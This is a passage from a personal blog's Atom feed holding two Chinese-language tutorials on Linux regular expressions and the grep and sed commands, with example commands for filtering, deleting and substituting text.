<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jughead YQQ</title>
  
  
  <link href="https://jason177.com/atom.xml" rel="self"/>
  
  <link href="https://jason177.com/"/>
  <updated>2022-05-25T13:25:11.000Z</updated>
  <id>https://jason177.com/</id>
  
  <author>
    <name>Jughead YQQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RE</title>
    <link href="https://jason177.com/2022/05/25/RE/"/>
    <id>https://jason177.com/2022/05/25/RE/</id>
    <published>2022-05-25T08:12:41.000Z</published>
    <updated>2022-05-25T13:25:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>正则表达式就是使用一些符号表达重复出现、大小写、开头\结尾的含义。可匹配日志、身份证等过滤特殊规律的东西。</p><p>注意系统的字符集：en_US.UTF-8(大部分情况90%没问题)，如果出现问题就修改一下字符集为C<code> export LANG=C</code></p><h2 id="1-正则符号分类"><a href="#1-正则符号分类" class="headerlink" title="1.正则符号分类"></a>1.正则符号分类</h2><table><thead><tr><th>分类</th><th></th><th>命令</th></tr></thead><tbody><tr><td>基础正则</td><td>^ $ ^$ . * .* [a-z] [^abc]</td><td>grep/sed/awk</td></tr><tr><td>扩展正则</td><td>+ | () {} ?</td><td>egrep/sed -r/awk</td></tr></tbody></table><h2 id="2-正则VS通配符"><a href="#2-正则VS通配符" class="headerlink" title="2.正则VS通配符"></a>2.正则VS通配符</h2><table><thead><tr><th>分类</th><th>诞生目标(用途)</th><th>支持的命令</th></tr></thead><tbody><tr><td>正则</td><td>三剑客、高级语言、进行过滤(匹配字符)</td><td>三剑客<font color=red>grep、sed、awk</font>、find、rename、expr</td></tr><tr><td>通配符</td><td>匹配文件(文件名)   *.txt *.log {01..10}</td><td>Linux下面大部分命令都支持</td></tr></tbody></table><h2 id="3-基础正则"><a href="#3-基础正则" class="headerlink" title="3.基础正则"></a>3.基础正则</h2><h3 id="1"><a href="#1" class="headerlink" title="1)^"></a>1)^</h3><p>“^my”以my开头的行</p><h3 id="2"><a href="#2" class="headerlink" title="2)$"></a>2)$</h3><p>“my$”以my结尾的行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061536959.png" alt="image-20220506153616846"></p><p>之类似乎有以”e”结尾的行，但是过滤之后没有显示任何东西，使用cat -A看一下尾巴</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061537209.png" alt="image-20220506153711139"></p><p>可以看到并不是e结尾，e后面还有空格</p><p>所以需要加空格匹配</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061538930.png" alt="image-20220506153811873"></p><h3 id="3-空行"><a href="#3-空行" class="headerlink" title="3)^$ 空行"></a>3)^$ 空行</h3><p>这一行中没有任何东西(连空格都没有，空格也算字符)，一般企业中使用这个方法排除空行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &quot;^$&quot; 文件名</span><br></pre></td></tr></table></figure><p>排除行首为#号注释的行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v &quot;^#&quot; 文件名</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4)."></a>4).</h3><p>表示任意一个字符，不匹配空行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061552013.png" alt="image-20220506155212935"></p><h3 id="5"><a href="#5" class="headerlink" title="5)\"></a>5)\</h3><p>如果要匹配普通的”.”，就用转义字符”\“，就是把特殊含义的字符转义回原来的字符含义</p><p>转义字符序列：</p><ul><li>\n 回车换行</li><li>\t tab键</li><li>\c 不换行</li></ul><h3 id="6"><a href="#6" class="headerlink" title="6)*"></a>6)*</h3><p>前一个字符连续出现0次或以上，请注意是连续出现，0(0出现一次)，000(0连续出现三次)，aesjieosja(字母连续出现10次)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061611673.png" alt="image-20220506161122580"></p><p>但是使用*号会打印所有数据</p><h3 id="7"><a href="#7" class="headerlink" title="7).*"></a>7).*</h3><p>所有内容，任何内容，任意内容(包括空行)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061615808.png" alt="image-20220506161504747"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061617507.png" alt="image-20220506161744452"></p><p>这里如果有两个t会出现匹配到最后一个t的情况</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061623713.png" alt="image-20220506162343665"></p><p>这就是正则表达式的贪婪性，*表示所有或连续出现的时候会表示出尽可能的贪婪(匹配得更多)</p><h3 id="8"><a href="#8" class="headerlink" title="8)[]"></a>8)[]</h3><p> [abc] 一次匹配一个字符，相当于一个字符(a或者b或者c)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061812508.png" alt="image-20220506181253425"></p><p>不是说匹配一个字符吗？grep -o显示匹配过程</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061814841.png" alt="image-20220506181433741"></p><p>所以一般用</p><ul><li>[a-z]</li><li>[A-Z]</li><li>[0-9]</li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061817089.png" alt="image-20220506181716010"></p><p>如果匹配文件中的所有大小写和数字</p><ul><li>[a-Z0-9]</li><li>[a-zA-Z0-9]</li><li>[a-z0-9] -i(grep中-i不区分大小写)</li></ul><h3 id="9"><a href="#9" class="headerlink" title="9)[^]"></a>9)[^]</h3><p>取反，取除了[]以外的任何字符，比如说[^a-z]，就是排除了[a-z]的26个字符，取其它字符</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061953234.png" alt="image-20220506195335162"></p><h2 id="4-扩展正则"><a href="#4-扩展正则" class="headerlink" title="4.扩展正则"></a>4.扩展正则</h2><table><thead><tr><th align="center">符号</th></tr></thead><tbody><tr><td align="center">+</td></tr><tr><td align="center">|</td></tr><tr><td align="center">()</td></tr><tr><td align="center">{}</td></tr><tr><td align="center">？</td></tr></tbody></table><h3 id="1-1"><a href="#1-1" class="headerlink" title="1) +"></a>1) +</h3><p>前一个字符连续出现1次或一次以上</p><p>注意因为是扩展正则，所以一般需要用的是egrep，就是grep +E ，但是也可以用grep然后放一个斜杠在+号前面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#x27;o\+&#x27; 文件名 == egrep &#x27;o+&#x27; 文件名 == grep -E &#x27;o+&#x27; 文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070433246.png" alt="image-20220507043302186"></p><p>这里的转义转成了特殊的含义，跟前面的不一样</p><p>这里如果想要得到连续的字母或者数字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep &#x27;[a-Z]+&#x27; 文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070437489.png" alt="image-20220507043723410"></p><p>如果只想要内容，则加-o</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070437304.png" alt="image-20220507043756227"></p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2) |"></a>2) |</h3><p>或者or的意思</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep &#x27;ro|e+&#x27; 文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070441165.png" alt="image-20220507044110104"></p><h3 id="3"><a href="#3" class="headerlink" title="3) ()"></a>3) ()</h3><ul><li>被括起来的内容表示一个整体(相当于一个字符串)</li><li>反向引用sed</li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070450056.png" alt="image-20220507045053963"></p><h3 id="4-1"><a href="#4-1" class="headerlink" title="4) {}"></a>4) {}</h3><p>表示连续出现</p><table><thead><tr><th><strong>符号</strong></th><th><strong>含义</strong></th><th></th></tr></thead><tbody><tr><td><strong>o{n,m}</strong></td><td>前一个字母o至少连续出现n次，最多连续出现m次</td><td>&gt;=n &lt;=m</td></tr><tr><td><strong>o{n}</strong></td><td>前一个字母o刚好连续出现n次</td><td>==n</td></tr><tr><td><strong>o{n,}</strong></td><td>前一个字母o至少连续出现n次</td><td>&gt;=n</td></tr><tr><td><strong>o{,m}</strong></td><td>前一个字母最多连续出现m次</td><td>&lt;=m</td></tr></tbody></table><p>第一种</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070454455.png" alt="image-20220507045450402"></p><p>如何知道它是先匹配三个还是两个，-o就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070457533.png" alt="image-20220507045741477"></p><p>所以如果超过最多的次数，就会先匹配最大值，直到最后小于最大值，这也是正则的贪婪性</p><hr><p>第二种</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070455534.png" alt="image-20220507045516489"></p><h3 id="5-1"><a href="#5-1" class="headerlink" title="5) ?"></a>5) ?</h3><p>前一个字符出现0次或者1次</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070504006.png" alt="image-20220507050450955"></p><h2 id="5-正则表达式的灵异事件"><a href="#5-正则表达式的灵异事件" class="headerlink" title="5.正则表达式的灵异事件"></a>5.正则表达式的灵异事件</h2><h3 id="1-使用”-“为什么都匹配了内容？"><a href="#1-使用”-“为什么都匹配了内容？" class="headerlink" title="1)使用”*“为什么都匹配了内容？"></a>1)使用”*“为什么都匹配了内容？</h3><p>明明没有出现前面的内容但是还是打印了所有内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061803336.png" alt="image-20220506180337151"></p><h3 id="2-里不会有特殊含义的字符"><a href="#2-里不会有特殊含义的字符" class="headerlink" title="2)[]里不会有特殊含义的字符"></a>2)[]里不会有特殊含义的字符</h3><p>所有在[]里面的字符，都不会有特殊含义，[]里面的内容是去掉特殊含义的，比如说[a-z|A-Z]，意思就是匹配大小写字母和符号”|”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061955120.png" alt="image-20220506195532055"></p><h3 id="3-与"><a href="#3-与" class="headerlink" title="3) []与|"></a>3) []与|</h3><table><thead><tr><th>符号</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>[]</td><td>1次匹配1个字符[abc] a或b或c</td><td>匹配单个字符[] 和 +</td></tr><tr><td>|</td><td>1次匹配1个或多个字符 abc|root连续的字符串     a|b|c 单个字符的出现</td><td>匹配单词</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205070445520.png" alt="image-20220507044550448"></p>]]></content>
    
    
    <summary type="html">来学一下正则表达式吧</summary>
    
    
    
    <category term="Linux" scheme="https://jason177.com/categories/Linux/"/>
    
    
    <category term="RE" scheme="https://jason177.com/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Linux三剑客的基础学习</title>
    <link href="https://jason177.com/2022/05/25/linuxthree/"/>
    <id>https://jason177.com/2022/05/25/linuxthree/</id>
    <published>2022-05-25T08:06:27.000Z</published>
    <updated>2022-05-25T13:25:11.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux三剑客特点与应用场景"><a href="#Linux三剑客特点与应用场景" class="headerlink" title="Linux三剑客特点与应用场景"></a>Linux三剑客特点与应用场景</h1><table><thead><tr><th>命令</th><th>特点</th><th>场景</th></tr></thead><tbody><tr><td>grep</td><td>过滤</td><td>grep命令过滤速度最快</td></tr><tr><td>sed</td><td>替换，修改文件内容，取行</td><td>如果要进行替换/修改文件内容，或是取出某范围内容(时间范围等)</td></tr><tr><td>awk</td><td>取列，统计计算</td><td>取列<br />对比，比较 &gt;= 、&lt;=、 != 、&gt;、 &lt;<br/>统计，计算(awk数组)</td></tr></tbody></table><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p><a href="https://blog.csdn.net/sj349781478/article/details/82930982">linux三剑客</a></p><p><a href="https://www.cnblogs.com/zhongguiyao/p/13940431.html">grep</a></p><p><a href="https://www.linuxprobe.com/linux-grep-sed.html">grep命令</a></p><p><strong>-n 显示行号</strong></p><p><strong>-v 不包括该内容，相反的</strong></p><p>^a 查找a开头的行</p><p>a$ 查找a结尾的行</p><p><strong>-i 不区分大小写</strong></p><p><strong>-c 统计匹配的行数</strong></p><p>-e or或关系</p><p>-E egrep</p><p>-F fgrep，不支持正则表达式</p><p>H 多文件匹配</p><p>-f </p><p>-w 精确匹配</p><hr><h3 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h3><p>1.匹配多文件的root</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111271527529.png" alt="image-20211127152745170"></p><h3 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h3><p>统计次数，跟wc -l是一样的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205081541652.png" alt="image-20220508154118499"></p><p>大概率如果大于3则正常运行，小于3说明有点问题</p><p>这里注意最后一行，grep命令吧自己搜索的命令搜出来了，所以apache运行的真实进程是6个，所以正确的判断进程数需要过滤掉grep，使用-v</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux |grep apache|grep -v grep|wc -l</span><br><span class="line">或者</span><br><span class="line">ps -aux |grep apache|grep -vc grep</span><br></pre></td></tr></table></figure><p>也可以在匹配的时候加个中括号[]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux |grep &#x27;[a]pache2&#x27; -c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205081857808.png" alt="image-20220508185736689"></p><p>因为grep执行的时候进程名字grep ‘[a]pache2’</p><p>但是在匹配的时候执行的名字是grep ‘apache2’</p><p>2.匹配以root或nobody开头的行，记住正则表达式的话要加双引号</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111271528005.png" alt="image-20211127152842896"></p><h3 id="ABC"><a href="#ABC" class="headerlink" title="-ABC"></a>-ABC</h3><p>3.-A(after)显示匹配到的内容的后面行，-B(before)显示匹配到的内容的前面行，-C(context)显示匹配到的内容的周围行。超出范围的就会省略掉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060537712.png" alt="image-20220506053722606"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060537673.png" alt="image-20220506053743596"></p><h3 id="v"><a href="#v" class="headerlink" title="-v"></a>-v</h3><p>4.-v是不匹配里面的内容，这里说明如何过滤掉空行或者显示空行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060540301.png" alt="image-20220506054029231"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060541384.png" alt="image-20220506054116321"></p><h3 id="e和-E"><a href="#e和-E" class="headerlink" title="-e和-E"></a>-e和-E</h3><p>5.-e相当于or，实现多选项之间的逻辑关系or</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060545401.png" alt="image-20220506054516327"></p><p>也可以用-E来进行更规范(扩展)的正则表达式的匹配egrep：</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060547174.png" alt="image-20220506054712068"></p><p>基础规范的比如说：</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060550256.png" alt="image-20220506055059199"></p><p>其实就是转不转义的问题</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060551910.png" alt="image-20220506055126847"></p><h3 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h3><p>可以通过第一个文件查找出来的内容从第二个文件中查找</p><p>如果只想显示查找到的内容，则用cat和管道符配合，即利用管道符来通过第一个文件的输出当作第二个文件的输入</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060621583.png" alt="image-20220506062121497"></p><h3 id="w"><a href="#w" class="headerlink" title="-w"></a>-w</h3><p>\b内容\b精确匹配,只查找指定的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205060612934.png" alt="image-20220506061254876"></p><p>“\bot\b”跟”^ot$”是一样的，也可以用-w</p><p>一般用来查看进程或端口，比如说过滤22端口</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205081907487.png" alt="image-20220508190714386"></p><h3 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h3><p>只打印匹配到的字符</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061455016.png" alt="image-20220506145552945"></p><h3 id="用正则过滤ip地址"><a href="#用正则过滤ip地址" class="headerlink" title="用正则过滤ip地址"></a>用正则过滤ip地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig |grep -E &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205061448548.png" alt="image-20220506144810397"></p><h2 id="sed查"><a href="#sed查" class="headerlink" title="sed查"></a>sed查</h2><p>sed是一种流编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。然后读入下行，执行下一个循环。如果没有使诸如‘D’ 的特殊命令，那会在两个循环之间清空模式空间，但不会清空保留空间。这样不断重复，直到文件末尾。文件内容并没有改变，除非你使用重定向存储输出。</p><ul><li>sed格式</li></ul><table><thead><tr><th>命令</th><th>选项</th><th>(s)sed命令功能(g)修饰符</th><th>参数(文件)</th></tr></thead><tbody><tr><td>sed</td><td>-r</td><td>‘s#root#admin#g’</td><td>231.txt</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><ul><li>sed命令核心功能：增删改查</li></ul><table><thead><tr><th>功能</th><th></th><th></th></tr></thead><tbody><tr><td><strong>s</strong></td><td>替换substitute sub</td><td></td></tr><tr><td><strong>p</strong></td><td>显示print</td><td></td></tr><tr><td>d</td><td>删除delete</td><td></td></tr><tr><td>cai</td><td>增加c/a/i</td><td></td></tr></tbody></table><h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><p>查找</p><table><thead><tr><th>查找格式</th><th></th><th></th></tr></thead><tbody><tr><td>‘2p’</td><td>指定行号查找</td><td></td></tr><tr><td>‘1,5p’</td><td>指定行号范围查找</td><td></td></tr><tr><td>‘/root/p’</td><td>类似grep，//里面可以写正则</td><td></td></tr><tr><td>‘/10:00’,/11:00/p’</td><td>表示范围的过滤</td><td></td></tr></tbody></table><p>以上内容皆可以混合使用，比如说’sed -n /102/,5p 123123.txt’，就是从内容102开始，打印到第5行结束</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082143538.png" alt="image-20220508214308467"></p><p> 如果是查看第四行到最后一行，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;4,$p&#x27; 111.txt</span><br></pre></td></tr></table></figure><p>这里的$是指最后一行</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082106200.png" alt="image-20220508210614130"></p><p>如果取最后一行则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;$p&#x27; 111.txt</span><br><span class="line">或者</span><br><span class="line">tail -1 111.txt</span><br></pre></td></tr></table></figure><p>但是我的linux啥都没显示不知道为啥，后来发现老毛病…最后一行是空，因为我习惯在输完内容之后点一下换行，把最后空的一行删掉就行了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082112429.png" alt="image-20220508211215354"></p><h3 id="p-1"><a href="#p-1" class="headerlink" title="//p"></a>//p</h3><p>查找内容，/内容/p</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/ro/p&#x27; 213.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082115351.png" alt="image-20220508211551253"></p><p>如果是查找某个内容到某个内容范围之间的内容，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/102/,/106/p&#x27; 123123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082127014.png" alt="image-20220508212754936"></p><p>如果没有106这个内容，相当于不告诉最后到达的范围，则会从102一直打印到最后一行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/102/,/10086/p&#x27; 123123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082140059.png" alt="image-20220508214005964"></p><p>在实际生产环境中，如果日志很大的话，使用vim会把内容一个个放进内存，这时候很可能导致内存不够，所以一般不会直接使用cat和vim，而更多是使用grep/sed/head/tail/more/less/awk</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>如果想要使用扩展的正则表达式，需要用-r</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/[ro]&#123;3&#125;/p&#x27; 231.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082123380.png" alt="image-20220508212339254"></p><h3 id="n"><a href="#n" class="headerlink" title="-n"></a>-n</h3><p>表示取消默认输出，因为如果什么都不加的话sed命令会显示文件里的所有内容，并且会再显示多一次选中的行，加-n则只显示想要的n行。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205081940766.png" alt="image-20220508194010684"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205081940689.png" alt="image-20220508194025629"></p><h3 id=""><a href="#" class="headerlink" title="!"></a>!</h3><p>取反的意思，加在p前面，如果是d的话也是加在前面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -nr &#x27;/^$|#/!p&#x27; 123123123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082305134.png" alt="image-20220508230517062"></p><h2 id="sed删除-d"><a href="#sed删除-d" class="headerlink" title="sed删除-d"></a>sed删除-d</h2><p>不是真正的删除 ，只是不显示，这里就是把之前查找使用的p换成d就可以了</p><table><thead><tr><th>查找格式</th><th></th><th></th></tr></thead><tbody><tr><td>‘2d’</td><td>指定行号查找</td><td></td></tr><tr><td>‘1,5d’</td><td>指定行号范围查找</td><td></td></tr><tr><td>‘/root/d’</td><td>类似grep，//里面可以写正则</td><td></td></tr><tr><td>‘/10:00/,/11:00/d’</td><td>表示范围的过滤</td><td></td></tr></tbody></table><p>d只支持行删除，如果需要删除行的一些内容，则使用的是替换，这里先说删除行的操作</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082159960.png" alt="image-20220508215901852"></p><p>可以看到并没有真正的删除，范围删除也是跟p同样的操作，接下来是内容的删除和内容范围的删除</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082200622.png" alt="image-20220508220028550"></p><p>接下来是混合删除，比如从102的内容删除到第三行(这里说的是第三行而不是接下来的三行)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082202609.png" alt="image-20220508220200498"></p><p>企业案例删除空行和注释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">egrep -v &#x27;^$|#&#x27; 231.txt</span><br><span class="line">sed -r &#x27;/^$|#/d&#x27; 231.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082206351.png" alt="image-20220508220639267"></p><h2 id="sed-增加cai"><a href="#sed-增加cai" class="headerlink" title="sed-增加cai"></a>sed-增加cai</h2><table><thead><tr><th>命令</th><th>含义</th><th></th></tr></thead><tbody><tr><td>c</td><td>replace替代这行的内容</td><td></td></tr><tr><td><strong>a</strong></td><td>append追加，向指定的行或每一行插入内容(行后面)</td><td></td></tr><tr><td>i</td><td>insert插入，向指定的行或每一行插入内容(行前面)</td><td></td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082310784.png" alt="image-20220508231043665"></p><p>范围添加行的话</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;1,3a 111&#x27; 123123.txt.bak</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090158879.png" alt="image-20220509015819778"></p><p>企业案例：向文件中追加多行内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">向config里面追加</span><br><span class="line">UseDNS no</span><br><span class="line">GSSAPIAUTCATION no</span><br><span class="line">PermitRootLogin no</span><br><span class="line"></span><br><span class="line"><span class="comment">#方法1：</span></span><br><span class="line">cat &gt;&gt;config&lt;&lt;<span class="string">EOF    #如果加入的内容有特殊符号，就用单引号把EOF</span>括起来，如果文件没创建，则是&gt;config&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">UseDNS no</span></span><br><span class="line"><span class="string">GSSAPIAUTCATION no</span></span><br><span class="line"><span class="string">PermitRootLogin no</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#方法2：sed</span></span><br><span class="line">sed <span class="string">&#x27;$a UseDNS no\nGSSAPIAUTCATION no\nPermitRootLogin no&#x27;</span> config</span><br></pre></td></tr></table></figure><p>一般都用第一种方法</p><p>config.txt没有创建时</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;config&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">UseDNS no</span></span><br><span class="line"><span class="string">GSSAPIAUTCATION no</span></span><br><span class="line"><span class="string">PermitRootLogin no</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082323188.png" alt="image-20220508232347102"></p><p>创建后</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt;config&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">UseDNS no</span></span><br><span class="line"><span class="string">GSSAPIAUTCATION no</span></span><br><span class="line"><span class="string">PermitRootLogin no</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205082324752.png" alt="image-20220508232414651"></p><h2 id="sed替换s"><a href="#sed替换s" class="headerlink" title="sed替换s"></a>sed替换s</h2><p>substitute替换</p><table><thead><tr><th align="center">替换格式</th></tr></thead><tbody><tr><td align="center"><strong>s###g</strong> (前两个#之间支持正则)</td></tr><tr><td align="center">s@@@g</td></tr><tr><td align="center">s///g</td></tr></tbody></table><p>其中，g是global全局的意思，有g就是全部都替换</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;s#[0-9]##g&#x27; 123123.txt   #把所有数字替换为空</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090052952.png" alt="image-20220509005230849"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#x27;s#[0-9]##&#x27; 123123.txt   #只把每行的第一个数字替换为空</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090052110.png" alt="image-20220509005242020"></p><p>如果只想要替换某范围内匹配到的内容，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -r &#x27;1,4&#123;s#[ ]#hah#&#125;&#x27; 123123.txt.bak   # 第一行到第四行匹配到的空格替换成haha</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202205090204342.png" alt="image-20220509020413219"></p><ul><li>后向引用，反向引用</li><li>口诀：先保护再引用</li></ul><h3 id="1-把数据规则化-比如每行用括号括起来"><a href="#1-把数据规则化-比如每行用括号括起来" class="headerlink" 